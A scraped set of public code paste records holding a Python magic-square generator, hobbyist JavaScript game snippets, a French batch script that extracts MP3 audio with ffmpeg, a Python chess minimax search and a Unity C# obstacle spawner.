        print(
            ""- Magic squares for dimensions less than 3 are not supported by this algorithm!\n""
        )
        return
    elif n % 2 == 0:
        print(""- Even dimension values are not supported by this algorithm!\n"")
        return
    
    # Initialize the magic square with zeros
    magicSquare = []
    for i in range(n):
        listt = []
        for j in range(n):
            listt.append(0)
        magicSquare.append(listt)
        
    # Initialize starting position
    i = n // 2
    j = n - 1

    # Set the number of elements to insert
    num = n * n
    count = 1

    # Populate the magic square
    while count <= num:
        if i == -1 and j == n:  # condition 4
            j = n - 2
            i = 0
        else:
            if j == n:  # column value is exceeding
                j = 0

            if i < 0:  # row  is becoming -1
                i = n - 1

        # Check if cell is occupied
        if magicSquare[i][j] != 0:
            j = j - 2
            i = i + 1
            continue

        else:
            magicSquare[i][j] = count
            count += 1

        # Move to the next cell
        i = i - 1
        j = j + 1  # condition 1

    # Print top border
    if n >= 1001:
        print(""\t\t\t┌"" + ""─"" * (8 * n + 1) + ""┐"")  # 1001x1001 - Infinity (not padded further)
    elif n >= 317:
        print(""\t\t\t┌"" + ""─"" * (7 * n + 1) + ""┐"")  # 317x317 - 999x999
    elif n >= 101:
        print(""\t\t\t┌"" + ""─"" * (6 * n + 1) + ""┐"")  # 101x101 - 315x315
    elif n >= 33:
        print(""\t\t\t┌"" + ""─"" * (5 * n + 1) + ""┐"")  # 33x33 - 99x99
    elif n >= 11:
        print(""\t\t\t┌"" + ""─"" * (4 * n + 1) + ""┐"")  # 11x11 - 31x31
    else:
        print(""\t\t\t┌"" + ""─"" * (3 * n + 1) + ""┐"")  # 3x3 - 9x9

    for i in range(n):
        print(""\t\t\t│ "", end="""")
        for j in range(n):
            # Format each number to have leading zeros if needed (up to 7-Digits)
            if n >= 1001:
                num_str = str(magicSquare[i][j]).zfill(7) # 7-Digit Values            
            elif n >= 315:
                num_str = str(magicSquare[i][j]).zfill(6) # 6-Digit Values
            elif n >= 101:
                num_str = str(magicSquare[i][j]).zfill(5) # 5-Digit Values
            elif n >= 33:
                num_str = str(magicSquare[i][j]).zfill(4) # 4-Digit Values
            elif n >= 11:
                num_str = str(magicSquare[i][j]).zfill(3) # 3-Digit Values
            else:
                num_str = str(magicSquare[i][j]).zfill(2) # 2-Digit Values
            print(f""{num_str} "", end="""")
        print(""│"")  # Print vertical line

    # Print bottom border
    if n >= 1001:
        print(""\t\t\t┌"" + ""─"" * (8 * n + 1) + ""┐"")  # 1001x1001 - Infinity (not padded further)
    elif n >= 319:
        print(""\t\t\t└"" + ""─"" * (7 * n + 1) + ""┘"") # 317x317 - 999x999
    elif n >= 101:
        print(""\t\t\t└"" + ""─"" * (6 * n + 1) + ""┘"") # 101x101 - 315x315
    elif n >= 33:
        print(""\t\t\t└"" + ""─"" * (5 * n + 1) + ""┘"") # 33x33 - 99x99
    elif n >= 11:
        print(""\t\t\t└"" + ""─"" * (4 * n + 1) + ""┘"") # 11x11 - 31x31
    else:
        print(""\t\t\t└"" + ""─"" * (3 * n + 1) + ""┘"") # 3x3 - 9x9

    # Print sum information
    print(
        ""\n\t  The sum of each row/column/diagonal is: "" + str(n * (n**2 + 1) / 2),
        ""\n"",
    )

# Main Function for Magic Square
if __name__ == ""__main__"":
    """"""
    Main function to execute the script.
    """"""
    print(""\t\t    :: MAGIC SQUARE GENERATOR ::\n"")
    n = int(
        input(
            ""Enter an odd number greater than 1 as the size of the Magic Square (n x n): ""
        )
    )
    if n <= 1:
        print(
            ""\n\t- Magic squares for dimensions less than or equal to 1 are not allowed.\n""
        )
    else:
        magic_square(n)
"
1m57Xd9F,Example 3,KingAesthetic,JavaScript,Sunday 12th of May 2024 02:22:10 PM CDT,"// function that simulates Enemy encounter
const enemies = [
    { name: 'Shrek', health: 30, attackPower: 8, loot: 'small gem' },
    { name: 'Orc', health: 50, attackPower: 12, loot: 'iron sword' },
    { name: 'Dragon', health: 100, attackPower: 20, loot: 'dragon scale' },
];

function encounterEnemy(playerHealth) {
    const randomEnemy = enemies[Math.floor(Math.random() * enemies.length)];
    console.log(`You Encountered a ${randomEnemy.name}!`);

    // player vs enemy simulation battle
    while (playerHealth > 0 && randomEnemy.health > 0) {
        // player attacks enemy
        const playerDamage = Math.floor(Math.random() * 10) + 1;
        randomEnemy.health -= playerDamage;

        // enemy attacks player
        const enemyDamage = randomEnemy.attackPower;
        playerHealth -= enemyDamage;
    }

    if (playerHealth <= 0) {
        console.log(""You are DEAD"");
    } else {
        console.log(`Victory! You defeated the ${randomEnemy.name}.`);
        console.log(`Loot obtained: ${randomEnemy.loot}`);
    }
}

const playerMaxHealth = 100;
encounterEnemy(playerMaxHealth);

// Puzzle solvING Function
function solvePuzzle(puzzlePieces) {
    return true;
}

const puzzlePieces = ['red', 'blue', 'green', 'yellow'];
const isPuzzleSolved = solvePuzzle(puzzlePieces);
console.log(`Puzzle solved: ${isPuzzleSolved}`);

// function for tracking achievements:
const playerAchievements = {
    defeatedDragon: false,
    reachedLevel20: false,
    collected100Gems: false,
};

// Function to unlock an achievement
function unlockAchievement(achievementName) {
    playerAchievements[achievementName] = true;
}
unlockAchievement(""reachedLevel20"");
console.log(`Achievements unlocked: ${Object.keys(playerAchievements).join(', ')}`);

// function that simulates the rolling of a Dice:
function rollDice(sides) {
    return Math.floor(Math.random() * sides) + 1;
}

const numSides = 6; // Standard six-sided die
const rollResult = rollDice(numSides);
console.log(`You rolled a ${rollResult}!`);

// function that simulates a Tic Tac Toe Game:
const board = [
    ['', '', ''],
    ['', '', ''],
    ['', '', ''],
];

let currentPlayer = 'X';

function printBoard() {
    console.log('Current board:');
    for (const row of board) {
        console.log(row.join(' '));
    }
}

function checkWin() {
    // Checking for a diagonal win
    for (let i = 0; i < 3; i++) {
        if (board[i][0] === currentPlayer && board[i][1] === currentPlayer && board[i][2] === currentPlayer) {
            return true;
        }
        if (board[0][i] === currentPlayer && board[1][i] === currentPlayer && board[2][i] === currentPlayer) {
            return true;
        }
    }
    if (board[0][0] === currentPlayer && board[1][1] === currentPlayer && board[2][2] === currentPlayer) {
        return true;
    }
    if (board[0][2] === currentPlayer && board[1][1] === currentPlayer && board[2][0] === currentPlayer) {
        return true;
    }
    return false;
}

function makeMove(row, col) {
    if (board[row][col] === '') {
        board[row][col] = currentPlayer;
        return true;
    }
    return false;
}
printBoard();
console.log(`Player ${currentPlayer}'s turn.`);
makeMove(1, 1);
printBoard();
currentPlayer = currentPlayer === 'X' ? 'O' : 'X';
console.log(`Player ${currentPlayer}'s turn.`);"
8vDgfHxq,Example 2,KingAesthetic,JavaScript,Sunday 12th of May 2024 02:21:10 PM CDT,"// function that simulates loot drops in RPG games:
function getRndLoot() {
    const lootTable = [
        {item: ""health potion"", chance: 0.2},
        {item: ""speed potion"", chance: 1.2},
        {item: ""rare coin"", chance: 1.1},
    ];
    const randomNum = Math.random();
    var selectedItem = null;
    for(const loot of lootTable) {
        if(randomNum < loot.chance) {
            selectedItem = loot.item;
            break;
        }
    }
    return selectedItem || `no loot`;
}
const droppedItem = getRndLoot();
console.log(droppedItem)

// function that tracks quests completed by players:
const completedQuests = [];
function completeQuest(questName) {
    if(!completedQuests.includes(questName)) {
        completedQuests.push(questName);
    }
}
completeQuest(""Find Darkost in the Armageddon"");
completeQuest(""Retrieve the crown from the forgotten dungeon"");
console.log(`Completed quests: ${completedQuests.join(', ')}`);

// function that simulates combat system:
function simulateCombat(playerHP, enemyHP) {
    while (playerHP > 0 && enemyHP > 0) {
        const playerDamage = Math.floor(Math.random() * 20) + 1;
        enemyHP -= playerDamage;
        const enemyDamage = 
        Math.floor(Math.random() * 8) + 1;
        playerHP -= enemyDamage;
    }
    if(playerHP <= 0) {
        console.log(""You DIED"");
    } else {
        console.log(""You have WON"");
    }
}
const playerHealth = 100;
const enemyHealth = 80;
simulateCombat(playerHealth, enemyHealth);

//function that generates random loot from treasure chests:
function openChest() {
    const possibleLoot = [""gold"", ""medkit"", ""magic wand"", ""gemstone""];
    const randomLoot = Math.floor(Math.random() * possibleLoot.length);
    return possibleLoot[randomLoot];
}
const foundLoot = openChest();
console.log(foundLoot);

// function that handles skill leveling
const playerSkills = {
    attack: 1,
    defense: 1,
    magic: 1,
};
function levelUpSkill(skill) {
    playerSkills[skill] += 1
}
levelUpSkill(""attack"");
console.log(playerSkills.attack);"
EWEsRqTR,Example 1,KingAesthetic,JavaScript,Sunday 12th of May 2024 02:18:48 PM CDT,"// function that prints a random number from 1 - 50:
function getRndNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)+ min);
}
const randomNum = getRndNumber(1, 50);
console.log(randomNum);

// function that drills a random material out from the ground:
const material = [""Diamond"", ""Platinum"", ""Gold"", ""Emerald"", ""Ruby"", ""Silver""];
function RndMaterial(arr) {
    const RndMaterial = Math.floor(Math.random() * arr.length);
    return arr[RndMaterial];
}
const randomMat = RndMaterial(material);
console.log(randomMat)

// function that calculates the area of a rectangle:
function Areaofrectangle(length, width) {
    return (length * width);
}
const length = 50
const width = 30
const area = length * width
console.log(area);

// function to apply a speed boost
function applySpeedBoost(currentSpeed, boostMultiplier) {
    return currentSpeed * boostMultiplier;
}
const playerSpeed = 20;
const boostMultiplier = 50;
const boostedSpeed = applySpeedBoost(playerSpeed, boostMultiplier);
console.log(boostedSpeed)

// function to simulate health regeneration
function regenerateHealth(currentHealth, regenerationRate, timeInSeconds) {
    const regeneratedHealth = currentHealth + regenerationRate * timeInSeconds;
    return Math.min(regeneratedHealth, 100); // Cap health at 100
}
const playerHealth = 80;
const regenerationRate = 2;
const timeElapsed = 5;
const newHealth = regenerateHealth(playerHealth, regenerationRate, timeElapsed);
console.log(`New health: ${newHealth}`);

// function to calculate experience points (XP)
function calculateXP(level, baseXP, multiplier) {
    return baseXP * Math.pow(level, multiplier);
}
const playerLevel = 5;
const baseXP = 100;
const xpMultiplier = 1.5;
const earnedXP = calculateXP(playerLevel, baseXP, xpMultiplier);
console.log(earnedXP);

// inventory system integration:
const playerInventory = {
    credits: 52,
    coins: 7,
    keys: 4,
    weapons: [""sword"", ""bow & arrow""],
};

// function that adds an item to the inventory of the player:
function addtoInventory(item, quantity) {
    if (playerInventory[item]) {
        playerInventory[item] += quantity;
    } else {
        playerInventory[item] = quantity;
    }
}
addtoInventory(""credits"", 75);
addtoInventory(""coins"", 25);
console.log(playerInventory);"
frw17fmX,Extraction audio conversion MP3,lincruste,Winbatch,Sunday 12th of May 2024 02:06:57 PM CDT,"@echo off
rem MB Technology, 2024
chcp 65001 > nul 2>&1
echo Extraction audio
echo Basé sur FFMPEG www.ffmpeg.org
mkdir convert
rem Pour démarrer la conversion, glisser le ou les fichiers video sur le batch.
@FOR %%A IN (%*) DO %~dp0\bin\ffmpeg -i %%A -vn -f mp3 "".\convert\%%~nA.mp3""
@pause"
XCxECr8F,tak toto ano: >3 #,max2201111,Python,Sunday 12th of May 2024 01:41:37 PM CDT,"import chess
from itertools import permutations

def generate_chess_positions(pieces):
    board_size = 8
    all_squares = [(i, j) for i in range(board_size) for j in range(board_size)]
    for squares in permutations(all_squares, len(pieces)):
        board = chess.Board(None)
        for piece, (row, col) in zip(pieces, squares):
            square_index = row * 8 + col  # Convert from (row, col) to square index
            board.set_piece_at(square_index, chess.Piece.from_symbol(piece))
            yield board.fen()

def simplify_fen_string(fen):
    parts = fen.split(' ')
    simplified_fen = ' '.join(parts[:4])  # Keeping only the position information
    return simplified_fen

def evaluate_board(board):
    if board.is_checkmate():
        return 1000 if board.turn == chess.BLACK else -1000
    elif board.is_stalemate() or board.is_insufficient_material():
        return 0
    return 4  # Default heuristic

def minimax(board, depth, alpha, beta, maximizing_player, node_count, completed_depths):
    node_count[0] += 1
    if node_count[0] % 1000000 == 0:
        print(f""Nodes explored: {node_count[0]}"")

    if board.is_game_over():
        if depth not in completed_depths:
            print(f""Depth {depth} completed for the first time."")
            completed_depths.add(depth)
        return [], evaluate_board(board)

    if depth > 3:  # Practical limit to prevent infinite recursion
        if depth not in completed_depths:
            print(f""Depth {depth} completed for the first time."")
            completed_depths.add(depth)
        return [], evaluate_board(board)

    best_eval = float('-inf') if maximizing_player else float('inf')
    best_sequence = []

    for move in board.legal_moves:
        board.push(move)
        sequence, eval = minimax(board, depth + 1, alpha, beta, not maximizing_player, node_count, completed_depths)
        board.pop()

        if maximizing_player and eval > best_eval:
            best_eval = eval
            best_sequence = [board.san(move)] + sequence
            alpha = max(alpha, eval)
            if beta <= alpha:
                break
        elif not maximizing_player and eval < best_eval:
            best_eval = eval
            best_sequence = [board.san(move)] + sequence
            beta = min(beta, eval)
            if beta <= alpha:
                break

    if depth not in completed_depths:
        print(f""Depth {depth} completed for the first time."")
        completed_depths.add(depth)

    return best_sequence, best_eval

# Main execution
initial_pieces = ""KkQ""
positions = list(generate_chess_positions(initial_pieces))

if positions:
    # Use the first position from generated positions for minimax
    first_position_fen = ""7k/2Q5/5K2/8/8/8/8/8 w - - 0 1"" #positions[0]
    board = chess.Board(first_position_fen)

    node_count = [0]  # Track nodes across recursive calls
    completed_depths = set()  # Track completion of each depth level
    sequence, evaluation = minimax(board, 0, float('-inf'), float('inf'), True, node_count, completed_depths)

    # Output results
    simplified_fen = simplify_fen_string(first_position_fen)
    print(""Simplified FEN for starting position:"", simplified_fen)
    print(""Best move sequence for first position:"", sequence)
    print(""Evaluation for first position:"", evaluation)
    print(""Total nodes explored:"", node_count[0])
else:
    print(""No positions were generated."")
"
6nTztrjd,Untitled,Frostyy22,C#,Sunday 12th of May 2024 01:20:46 PM CDT,"using System.Collections.Generic;
using UnityEngine;

public class GameManager : MonoBehaviour
{
    [Header(""Game Settings"")]
    [Space]
    [SerializeField] private GameObject[] spawnPoints;
    [SerializeField] private GameObject[] obstacles;
    [SerializeField] private float timeBetweenSpawns;

    private float timer;

    void Update()
    {
        timer += Time.deltaTime;

        if (timer > timeBetweenSpawns)
        {
            timer = 0;

            List<int> numbers = new List<int> { 0, 1, 2, 3, 4, 5, 6, 7 };
            List<int> result = new List<int>();

            for (int i = 0; i < 6; i++)
            {
                if (numbers.Count == 0)
                {
                    break;
                }

                int index = Random.Range(0, numbers.Count);
                result.Add(numbers[index]);
                numbers.RemoveAt(index);

                GameObject obstaclePrefab = obstacles[Random.Range(0, obstacles.Length)];

                if (numbers.Count > 0)
                {
                    int spawnPointIndex = numbers[Random.Range(0, numbers.Count)];
                    Instantiate(obstaclePrefab, spawnPoints[spawnPointIndex].transform.position, Quaternion.identity);
                    numbers.RemoveAt(spawnPointIndex);
                }
            }
        }
    }
}"
